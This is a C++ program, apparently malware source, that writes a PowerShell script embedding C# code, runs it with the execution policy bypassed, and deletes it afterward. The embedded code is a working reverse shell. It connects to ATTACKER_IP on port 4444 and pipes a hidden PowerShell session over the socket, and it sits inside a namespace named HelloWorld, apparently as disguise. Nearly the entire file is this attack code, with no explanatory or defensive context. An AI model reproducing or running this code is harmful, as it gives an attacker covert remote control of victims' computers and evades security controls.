// Created by Alienum
#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

int main()
{

    ofstream file;
    file.open("betrayal.ps1");

    string powershell;


    powershell = "$code = @\"\n";
    powershell += "using System;\n";
    powershell += "using System.Text;\n";
    powershell += "using System.IO;\n";
    powershell += "using System.Diagnostics;\n";
    powershell += "using System.ComponentModel;\n";
    powershell += "using System.Linq;\n";
    powershell += "using System.Net;\n";
    powershell += "using System.Net.Sockets;\n";
    powershell += "\n";
    powershell += "\n";
    powershell += "namespace HelloWorld\n";
    powershell += "{\n";
    powershell += "\tpublic class Program\n";
    powershell += "\t{\n";
    powershell += "\t\tstatic StreamWriter streamWriter;\n";
    powershell += "\n";
    powershell += "\t\tpublic static void Main()\n";
    powershell += "\t\t{\n";
    powershell += "\t\t\tusing(TcpClient client = new TcpClient(\"ATTACKER_IP\", 4444))\n";
    powershell += "\t\t\t{\n";
    powershell += "\t\t\t\tusing(Stream stream = client.GetStream())\n";
    powershell += "\t\t\t\t{\n";
    powershell += "\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n";
    powershell += "\t\t\t\t\t{\n";
    powershell += "\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n";
    powershell += "\t\t\t\t\t\t\n";
    powershell += "\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n";
    powershell += "\n";
    powershell += "\t\t\t\t\t\tProcess p = new Process();\n";
    powershell += "\t\t\t\t\t\tp.StartInfo.FileName = \"powershell.exe\";\n";
    powershell += "\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n";
    powershell += "\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n";
    powershell += "\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n";
    powershell += "\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n";
    powershell += "\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n";
    powershell += "\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n";
    powershell += "\t\t\t\t\t\tp.Start();\n";
    powershell += "\t\t\t\t\t\tp.BeginOutputReadLine();\n";
    powershell += "\n";
    powershell += "\t\t\t\t\t\twhile(true)\n";
    powershell += "\t\t\t\t\t\t{\n";
    powershell += "\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n";
    powershell += "\t\t\t\t\t\t\t//strInput.Append(\"\\n\");\n";
    powershell += "\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n";
    powershell += "\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n";
    powershell += "\t\t\t\t\t\t}\n";
    powershell += "\t\t\t\t\t}\n";
    powershell += "\t\t\t\t}\n";
    powershell += "\t\t\t}\n";
    powershell += "\t\t}\n";
    powershell += "\n";
    powershell += "\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n";
    powershell += "        {\n";
    powershell += "            StringBuilder strOutput = new StringBuilder();\n";
    powershell += "\n";
    powershell += "            if (!String.IsNullOrEmpty(outLine.Data))\n";
    powershell += "            {\n";
    powershell += "                try\n";
    powershell += "                {\n";
    powershell += "                    strOutput.Append(outLine.Data);\n";
    powershell += "                    streamWriter.WriteLine(strOutput);\n";
    powershell += "                    streamWriter.Flush();\n";
    powershell += "                }\n";
    powershell += "                catch (Exception) { }\n";
    powershell += "            }\n";
    powershell += "        }\n";
    powershell += "\n";
    powershell += "\t}\n";
    powershell += "}\n";
    powershell += "\"@";

    powershell += "\nAdd-Type -TypeDefinition $code -Language CSharp\n";
    powershell += "iex \"[HelloWorld.Program]::Main()\"";
    file << powershell << endl;
    file.close();

    system("powershell -ExecutionPolicy Bypass -F betrayal.ps1");

    remove("betrayal.ps1");

    return 0;
}
